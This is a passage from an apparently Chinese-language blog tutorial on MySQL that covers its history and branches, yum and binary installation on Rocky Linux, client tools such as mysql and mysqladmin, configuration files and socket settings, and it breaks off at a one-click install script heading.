Language,结构化查询语言是1974年由Boyce和Chamberlin提出的一个通用的、功能极强的关系性数据库语言</p><p>SQL解释器：将SQL语句解释成机器语言</p><p>数据存储协议：应用层协议，C/S</p><ul><li>S：server, 监听于套接字，接收并处理客户端的应用请求</li><li>C：Client</li></ul><p>客户端程序接口</p><ul><li>CLI</li><li>GUI</li></ul><p>应用编程接口</p><ul><li>ODBC：Open Database Connectivity</li><li>JDBC：Java Data Base Connectivity</li></ul></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a></h1><hr><h1 id="二、MySQL安装和基本使用"><a href="#二、MySQL安装和基本使用" class="headerlink" title="二、MySQL安装和基本使用"></a>二、MySQL安装和基本使用</h1><h2 id="1-MySQL-介绍"><a href="#1-MySQL-介绍" class="headerlink" title="1 MySQL 介绍"></a>1 MySQL 介绍</h2><h3 id="1-1-MySQL系列"><a href="#1-1-MySQL系列" class="headerlink" title="1.1 MySQL系列"></a>1.1 MySQL系列</h3><blockquote><p><strong>MySQL 的三大主要分支</strong></p><ul><li>MySQL</li><li>Mariadb</li><li>Percona Server</li></ul><p><strong>官方网址</strong></p><ul><li><a href="https://www.mysql.com/">https://www.mysql.com/</a></li><li><a href="http://mariadb.org/">http://mariadb.org/</a></li><li><a href="https://www.percona.com/">https://www.percona.com</a></li></ul><p><strong>官方文档</strong></p><ul><li><a href="https://dev.mysql.com/doc/">https://dev.mysql.com/doc/</a></li><li><a href="https://mariadb.com/kb/en/">https://mariadb.com/kb/en/</a>  </li><li><a href="https://www.percona.com/software/mysql-database/percona-server">https://www.percona.com/software/mysql-database/percona-server</a></li></ul><p><strong>版本演变</strong></p><ul><li>MySQL：5.1 –&gt; 5.5 –&gt; 5.6 –&gt; 5.7 –&gt;8.0</li><li>MariaDB：5.1 –&gt;5.5 –&gt;10.0–&gt; 10.1 –&gt; 10.2 –&gt; 10.3 –&gt; 10.4 –&gt; 10.5</li><li>MySQL被Sun收购后，搞了个过渡的6.0版本，没多久就下线了,后来被Oracle收购后，终于迎来了像样的5.6版本，之后就是5.7、8.0版本。由于6.0版本号已被用过，7.x系列版本专用于NDB Cluster，因而新版本号从8.0开始。</li></ul></blockquote><h3 id="1-2-MySQL的特性"><a href="#1-2-MySQL的特性" class="headerlink" title="1.2 MySQL的特性"></a>1.2 MySQL的特性</h3><blockquote><ul><li>开源免费</li><li>插件式存储引擎：也称为”表类型”，存储管理器有多种实现版本，功能和特性可能均略有差别；用户可根据需要灵活选择,Mysql5.5.5开始<strong>innoDB引擎是MYSQL默认引擎</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">MyISAM ==&gt; Aria <br>InnoDB ==&gt; XtraDB<br></code></pre></td></tr></table></figure><ul><li><strong>单进程，多线程</strong></li><li>诸多扩展和新特性</li><li>提供了较多测试组件</li></ul></blockquote><hr><h2 id="2-MySQL-安装方式介绍和快速安装"><a href="#2-MySQL-安装方式介绍和快速安装" class="headerlink" title="2 MySQL 安装方式介绍和快速安装"></a>2 MySQL 安装方式介绍和快速安装</h2><h3 id="2-1-yum-安装"><a href="#2-1-yum-安装" class="headerlink" title="2.1 yum 安装"></a>2.1 yum 安装</h3><p><a href="https://mirrors.tuna.tsinghua.edu.cn/mysql/yum/">mysql最新源</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># yum install -y mysql-server</span><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl enable --now mysqld</span><br>Created symlink /etc/systemd/system/multi-user.target.wants/mysqld.service → /usr/lib/systemd/system/mysqld.service.<br>[root@rocky01 ~]<span class="hljs-comment"># ss -ntl</span><br>State      Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process<br>LISTEN     0           70                           *:33060                      *:*<br>LISTEN     0           128                          *:3306                       *:*<br><br>[root@rocky01 ~]<span class="hljs-comment"># mysql</span><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 13<br>Server version: 8.0.26 Source distribution<br><br>Copyright (c) 2000, 2021, Oracle and/or its affiliates.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; status<br>--------------<br>mysql  Ver 8.0.26 <span class="hljs-keyword">for</span> Linux on x86_64 (Source distribution)<br><br>Connection <span class="hljs-built_in">id</span>:13<br>Current database:<br>Current user:root@localhost<br>SSL:Not <span class="hljs-keyword">in</span> use<br>Current pager:stdout<br>Using outfile:<span class="hljs-string">&#x27;&#x27;</span><br>Using delimiter:;<br>Server version:8.0.26 Source distribution<br>Protocol version:10<br>Connection:Localhost via UNIX socket<br>Server characterset:utf8mb4<br>Db     characterset:utf8mb4<br>Client characterset:utf8mb4<br>Conn.  characterset:utf8mb4<br>UNIX socket:/var/lib/mysql/mysql.sock<br>Binary data as:Hexadecimal<br>Uptime:47 min 31 sec<br><br>Threads: 2  Questions: 21  Slow queries: 0  Opens: 140  Flush tables: 3  Open tables: 56  Queries per second avg: 0.007<br>--------------<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><h3 id="2-2-初始化脚本提高安全性"><a href="#2-2-初始化脚本提高安全性" class="headerlink" title="2.2 初始化脚本提高安全性"></a>2.2 初始化脚本提高安全性</h3><p>运行脚本：[root@centos7 ~]# <strong>mysql_secure_installation</strong> </p><blockquote><ul><li><strong>设置数据库管理员root口令</strong></li><li><strong>禁止root远程登录</strong></li><li><strong>删除anonymous（匿名）用户帐号</strong></li><li><strong>删除test数据库</strong></li></ul></blockquote><hr><h2 id="3-MySQL-组成和常用工具"><a href="#3-MySQL-组成和常用工具" class="headerlink" title="3 MySQL 组成和常用工具"></a>3 MySQL 组成和常用工具</h2><h3 id="3-1-客户端程序"><a href="#3-1-客户端程序" class="headerlink" title="3.1 客户端程序"></a>3.1 客户端程序</h3><blockquote><ul><li>mysql: 基于mysql协议交互式或非交互式的CLI工具</li><li>mysqldump：备份工具，基于mysql协议向mysqld发起查询请求，并将查得的所有数据转换成insert等写操作语句保存文本文件中</li><li>mysqladmin：基于mysql协议管理mysqld</li><li>mysqlimport：数据导入工具</li></ul><p>MyISAM存储引擎的管理工具：</p><ul><li>myisamchk：检查MyISAM库</li><li>myisampack：打包MyISAM表，只读</li></ul></blockquote><h3 id="3-2-服务器端程序"><a href="#3-2-服务器端程序" class="headerlink" title="3.2 服务器端程序"></a>3.2 服务器端程序</h3><blockquote><ul><li>mysqld_safe</li><li>mysqld</li><li>mysqld_multi 多实例 ，示例：mysqld_multi –example</li></ul></blockquote><h3 id="3-3-用户账号"><a href="#3-3-用户账号" class="headerlink" title="3.3 用户账号"></a>3.3 用户账号</h3><blockquote><p>说明：</p><ul><li><p><strong>HOST限制此用户可通过哪些远程主机连接mysql服务器</strong></p></li><li><p>支持使用通配符</p></li><li><ul><li><strong>% 匹配任意长度的任意字符,相当于shell中*</strong>, 示例: 172.16.0.0/255.255.0.0 或 172.16.%.%</li><li><strong>_ 匹配任意单个字符,相当于shell中?</strong></li></ul></li></ul></blockquote><p>mysql用户账号由两部分组成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;USERNAME&#x27;</span>@<span class="hljs-string">&#x27;HOST&#x27;</span><br>root@<span class="hljs-string">&#x27;10.0.0.100&#x27;</span><br>root@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span><br>root@<span class="hljs-string">&#x27;%&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="3-4-mysql-客户端命令"><a href="#3-4-mysql-客户端命令" class="headerlink" title="3.4 mysql 客户端命令"></a>3.4 mysql 客户端命令</h3><h4 id="3-4-1-mysql-运行命令类型"><a href="#3-4-1-mysql-运行命令类型" class="headerlink" title="3.4.1 mysql 运行命令类型"></a>3.4.1 mysql 运行命令类型</h4><blockquote><ul><li>客户端命令：本地执行，每个命令都完整形式和简写格式</li><li>服务端命令：通过mysql协议发往服务器执行并取回结果，<strong>命令末尾都必须使用命令结束符号</strong>，默认为分号</li></ul></blockquote><h5 id="范例：查看版本"><a href="#范例：查看版本" class="headerlink" title="范例：查看版本"></a>范例：查看版本</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#客户端</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysql -V</span><br>mysql  Ver 8.0.26 <span class="hljs-keyword">for</span> Linux on x86_64 (Source distribution)<br><br><span class="hljs-comment">#服务端</span><br>mysql&gt; SELECT VERSION();<br>+-----------+<br>| VERSION() |<br>+-----------+<br>| 8.0.26    |<br>+-----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h4 id="3-4-2-mysql-使用模式"><a href="#3-4-2-mysql-使用模式" class="headerlink" title="3.4.2 mysql 使用模式"></a>3.4.2 mysql 使用模式</h4><blockquote><ul><li>交互模式</li><li>脚本模式：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -uUSERNAME -pPASSWORD &lt; /path/somefile.sql<br><span class="hljs-built_in">cat</span> /path/somefile.sql |mysql -uUSERNAME -pPASSWORD<br>mysql&gt;<span class="hljs-built_in">source</span> /path/from/somefile.sql<br></code></pre></td></tr></table></figure></blockquote><h4 id="3-4-3-mysql命令使用格式"><a href="#3-4-3-mysql命令使用格式" class="headerlink" title="3.4.3 mysql命令使用格式"></a>3.4.3 mysql命令使用格式</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql <span class="hljs-selector-attr">[OPTIONS]</span> <span class="hljs-selector-attr">[database]</span><br></code></pre></td></tr></table></figure><blockquote><p>mysql客户端常用选项：</p><ul><li>-A, –no-auto-rehash 禁止补全</li><li><strong>-u, –user= 用户名,默认为root</strong></li><li><strong>-h, –host= 服务器主机,默认为localhost</strong></li><li><strong>-p, –passowrd= 用户密码,建议使用-p,默认为空密码</strong></li><li><strong>-P, –port= 服务器端口</strong></li><li>-S, –socket= 指定连接socket文件路径</li><li>-D, –database= 指定默认数据库</li><li>-C, –compress 启用压缩</li><li><strong>-e  “SQL” 执行SQL命令</strong></li><li>-V, –version 显示版本</li><li>-v  –verbose 显示详细信息</li><li>–print-defaults 获取程序默认使用的配置</li></ul></blockquote><h5 id="范例：修改提示符"><a href="#范例：修改提示符" class="headerlink" title="范例：修改提示符"></a>范例：修改提示符</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#临时修改mysql提示符</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysql -uroot -p123456 --prompt=&quot;(\\u@\\h) [\\d]&gt;\\_&quot; </span><br><br><span class="hljs-comment">#临时修改mysql提示符</span><br>[root@rocky01 ~]<span class="hljs-comment"># export MYSQL_PS1=&quot;(\\u@\\h) [\\d]&gt;\\_&quot;  </span><br><br><span class="hljs-comment">#持久修改mysql提示符</span><br>[root@rocky01 ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysql]<br>prompt=<span class="hljs-string">&quot;[\\u@\\h \\d]&gt;\\_&quot;</span><br></code></pre></td></tr></table></figure><h5 id="范例：配置所有MySQL-客户端的自动登录"><a href="#范例：配置所有MySQL-客户端的自动登录" class="headerlink" title="范例：配置所有MySQL 客户端的自动登录"></a>范例：配置所有MySQL 客户端的自动登录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysql]<br>user=root<br>password=123456<br></code></pre></td></tr></table></figure><h4 id="3-4-4-mysqladmin命令"><a href="#3-4-4-mysqladmin命令" class="headerlink" title="3.4.4 mysqladmin命令"></a>3.4.4 mysqladmin命令</h4><p>mysqladmin 命令格式</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mysqladmin [OPTIONS] <span class="hljs-keyword">command</span> <span class="hljs-keyword">command</span>.<span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><h5 id="使用范例"><a href="#使用范例" class="headerlink" title="使用范例"></a>使用范例</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看mysql服务是否正常，如果正常提示mysqld is alive</span><br>mysqladmin -uroot -p123456 ping<br><br><span class="hljs-comment">#关闭mysql服务，但mysqladmin命令无法开启mysql</span><br>mysqladmin -uroot -p123456 shutdown<br><br><span class="hljs-comment">#创建数据库testdb</span><br>mysqladmin -uroot -p123456 create testdb <br><br><span class="hljs-comment">#删除数据库testdb</span><br>mysqladmin -uroot -p123456 drop testdb<br><br><span class="hljs-comment">#修改root密码</span><br>mysqladmin -uroot -p123456 password <span class="hljs-string">&quot;654321&quot;</span><br><br><span class="hljs-comment">#日志滚动,生成新文件/var/lib/mysql/mariadb-bin.00000N</span><br>mysqladmin -uroot -p123456 flush-logs<br></code></pre></td></tr></table></figure><h4 id="3-4-5-mycli"><a href="#3-4-5-mycli" class="headerlink" title="3.4.5 mycli"></a>3.4.5 mycli</h4><p>MyCLI 是基于Python开发的MySQL的命令行工具，具有自动完成和语法突出显示功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#CentOS8安装</span><br>[root@centos8 ~]<span class="hljs-comment">#yum install python3-pip -y</span><br>[root@centos8 ~]<span class="hljs-comment">#pip3 install mycli</span><br><br><span class="hljs-comment">#ubuntu安装</span><br>[root@ubuntu1804 ~]<span class="hljs-comment">#apt -y install mycli</span><br>[root@ubuntu1804 ~]<span class="hljs-comment">#mycli -u root -S /var/run/mysqld/mysqld.sock</span><br></code></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221023191447604-677340251.png"><img src="2927659-20221023191447604-677340251.png" alt="img"></a></p><hr><h3 id="3-5-服务器端配置"><a href="#3-5-服务器端配置" class="headerlink" title="3.5 服务器端配置"></a>3.5 服务器端配置</h3><h4 id="3-5-1-服务器端配置文件"><a href="#3-5-1-服务器端配置文件" class="headerlink" title="3.5.1 服务器端配置文件"></a>3.5.1 服务器端配置文件</h4><blockquote><p> 服务器端(mysqld)：工作特性有多种配置方式</p><p>1、命令行选项：</p><p>2、配置文件：类ini格式,集中式的配置，能够为mysql的各应用程序提供配置信息</p><p>服务器端配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/my.cnf   <span class="hljs-comment">#Global选项</span><br>/etc/mysql/my.cnf <span class="hljs-comment">#Global选项</span><br>~/.my.cnf <span class="hljs-comment">#User-specific 选项</span><br></code></pre></td></tr></table></figure><p>配置文件格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mysqld]<br>[mysqld_safe]<br>[mysqld_multi]<br>[mysql]<br>[mysqladmin]<br>[mysqldump]<br>[server]<br>[client]<br></code></pre></td></tr></table></figure><ul><li><strong>[client] 里面的内容可以被 mysql,mysqladmin,mysqldump 等客户端读取的，而 [mysql]里的内容只能给mysql客户端读取</strong></li><li><strong>两者都配置了一样的参数时，遵循覆盖原则，选取最下面的</strong></li><li>MySQL的客户端都是可以在命令行指定连接参数的，<strong>如配置文件的参数错误，可直接在命令行输入该参数覆盖参数文件参数</strong></li></ul><p>说明：</p><ul><li><strong>_和- 相同</strong></li><li><strong>1，ON，TRUE意义相同</strong></li><li><strong>0，OFF，FALSE意义相同,无区分大小写</strong></li></ul></blockquote><h4 id="3-5-2-socket-连接说明"><a href="#3-5-2-socket-连接说明" class="headerlink" title="3.5.2 socket 连接说明"></a>3.5.2 socket 连接说明</h4><blockquote><p> 服务器监听的两种 socket 地址：</p><ul><li>ip socket: 监听在tcp的3306端口，支持远程通信 ，侦听3306/tcp端口可以在绑定有一个或全部接口IP上</li><li>unix sock: 监听在sock文件上，仅支持本机通信, 如：/var/lib/mysql/mysql.sock)</li></ul><p>说明：host为localhost 时自动使用unix sock</p></blockquote><h5 id="范例：MySQL的端口"><a href="#范例：MySQL的端口" class="headerlink" title="范例：MySQL的端口"></a>范例：MySQL的端口</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost (none)]&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;port&#x27;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| port          | 3306  |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br><br><span class="hljs-comment">#MySQL8.0增加了一个33060/tcp端口</span><br><span class="hljs-comment">#Port 33060 is the default port for the MySQL Database Extended Interface (the MySQL X Protocol).扩展接口的端口</span><br>[root@localhost (none)]&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;mysqlx_port&#x27;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| mysqlx_port   | 33060 |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h4 id="3-5-3-关闭mysqld网络连接"><a href="#3-5-3-关闭mysqld网络连接" class="headerlink" title="3.5.3 关闭mysqld网络连接"></a>3.5.3 关闭mysqld网络连接</h4><blockquote><p>只侦听本地客户端， 所有客户端和服务器的交互都通过一个socket文件实现，socket的配置存放在/var/lib/mysql/mysql.sock） 可在/etc/my.cnf修改</p></blockquote><p>范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br>[mysqld]<br>skip-networking=1<br></code></pre></td></tr></table></figure><hr><h2 id="4-通用二进制格式安装-MySQL"><a href="#4-通用二进制格式安装-MySQL" class="headerlink" title="4 通用二进制格式安装 MySQL"></a>4 通用二进制格式安装 MySQL</h2><h3 id="实战案例：手动安装MySQL-5-7、MySQL8-0"><a href="#实战案例：手动安装MySQL-5-7、MySQL8-0" class="headerlink" title="实战案例：手动安装MySQL 5.7、MySQL8.0"></a>实战案例：手动安装MySQL 5.7、MySQL8.0</h3><h4 id="（1）安装相关包"><a href="#（1）安装相关包" class="headerlink" title="（1）安装相关包"></a>（1）安装相关包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># yum -y install libaio numactl-libs</span><br></code></pre></td></tr></table></figure><h4 id="（2）创建用户和组"><a href="#（2）创建用户和组" class="headerlink" title="（2）创建用户和组"></a>（2）创建用户和组</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupadd mysql<br>useradd -r -g mysql -s /bin/false mysql<br></code></pre></td></tr></table></figure><h4 id="（3）准备程序文件"><a href="#（3）准备程序文件" class="headerlink" title="（3）准备程序文件"></a>（3）准备程序文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#官网下载二进制包</span><br>https://dev.mysql.com/downloads/mysql/<br><br>[root@rocky01 ~]<span class="hljs-comment"># tar xf mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz -C /usr/local</span><br>[root@rocky01 ~]<span class="hljs-comment"># ln -s /usr/local/mysql-8.0.31-linux-glibc2.12-x86_64/ mysql</span><br>[root@rocky01 ~]<span class="hljs-comment"># chown -R root:root /usr/local/mysql/</span><br></code></pre></td></tr></table></figure><h4 id="（5）准备环境变量"><a href="#（5）准备环境变量" class="headerlink" title="（5）准备环境变量"></a>（5）准备环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># echo &#x27;PATH=/usr/local/mysql/bin:$PATH&#x27; &gt; /etc/profile.d/mysql.sh</span><br>[root@rocky01 ~]<span class="hljs-comment"># . /etc/profile.d/mysql.sh</span><br></code></pre></td></tr></table></figure><h4 id="（6）准备配置文件"><a href="#（6）准备配置文件" class="headerlink" title="（6）准备配置文件"></a>（6）准备配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># vim /etc/my.cnf</span><br>[mysqld]<br>datadir=/data/mysql<br>skip_name_resolve=1<br>socket=/data/mysql/mysql.sock        <br>log-error=/data/mysql/mysql.log<br>pid-file=/data/mysql/mysql.pid<br>[client]<br>socket=/data/mysql/mysql.sock<br></code></pre></td></tr></table></figure><h4 id="（7）初始化数据库文件并提取root密码"><a href="#（7）初始化数据库文件并提取root密码" class="headerlink" title="（7）初始化数据库文件并提取root密码"></a>（7）<strong>初始化数据库文件并提取<strong><strong>root</strong></strong>密码</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/data/mysql 会自动生成,但是/data/必须事先存在</span><br>[root@rocky01 ~]<span class="hljs-comment"># mkdir -pv /data/mysql</span><br></code></pre></td></tr></table></figure><p> <strong>方式****1:</strong> <strong>生成随机密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># mysqld --initialize --user=mysql --datadir=/data/mysql</span><br>[root@rocky01 ~]<span class="hljs-comment"># grep password /data/mysql/mysql.log</span><br>2022-10-23T13:54:58.508775Z 6 [Note] [MY-010454] [Server] A temporary password is generated <span class="hljs-keyword">for</span> root@localhost: L!fdbgQpH2AQ<br><br><span class="hljs-comment">#这后面为生成的随机密码</span><br><span class="hljs-comment">#密码L!fdbgQpH2AQ</span><br></code></pre></td></tr></table></figure><p><strong>方式****2:</strong> <strong>生成</strong> <strong>root</strong> <strong>空密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqld --initialize-insecure --user=mysql --datadir=/data/mysql<br></code></pre></td></tr></table></figure><h4 id="（8）准备服务脚本和启动"><a href="#（8）准备服务脚本和启动" class="headerlink" title="（8）准备服务脚本和启动"></a>（8）准备服务脚本和启动</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld</span><br>[root@rocky01 ~]<span class="hljs-comment"># chkconfig --add mysqld</span><br>[root@rocky01 ~]<span class="hljs-comment"># service mysqld start</span><br>Starting MySQL.. SUCCESS!<br></code></pre></td></tr></table></figure><p><strong>（9）修改口令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#修改前面生成的随机密码为指定密码</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysqladmin -uroot -p&#x27;L!fdbgQpH2AQ&#x27; password 123456</span><br>mysqladmin: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>Warning: Since password will be sent to server <span class="hljs-keyword">in</span> plain text, use ssl connection to ensure password safety.<br><br><span class="hljs-comment">#修改前面生成的空密码为指定密码</span><br>mysqladmin -uroot password 123456<br></code></pre></td></tr></table></figure><h4 id="（10）测试登录"><a href="#（10）测试登录" class="headerlink" title="（10）测试登录"></a>（10）测试登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># mysql -uroot -p123456</span><br>mysql: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 8<br>Server version: 8.0.31 MySQL Community Server - GPL<br>...省略..<br><br><span class="hljs-comment">#注：若报如下错误，请执行下面命令</span><br>[root@rocky01 ~]<span class="hljs-comment"># mysql -uroot -p123456</span><br>mysql: error <span class="hljs-keyword">while</span> loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory<br>[root@rocky01 ~]<span class="hljs-comment"># ln -s /usr/lib64/libtinfo.so.6.1 /usr/lib64/libtinfo.so.5</span><br></code></pre></td></tr></table></figure><h3 id="实战案例：一键安装MySQL5-7、MySQL8-0脚本"><a href="#实战案例：一键安装MySQL5-7、MySQL8-0脚本" class="headerlink" title="实战案例：一键安装MySQL5.7、MySQL8.0脚本"></a>实战案例：一键安装MySQL5.7、MySQL8.0脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 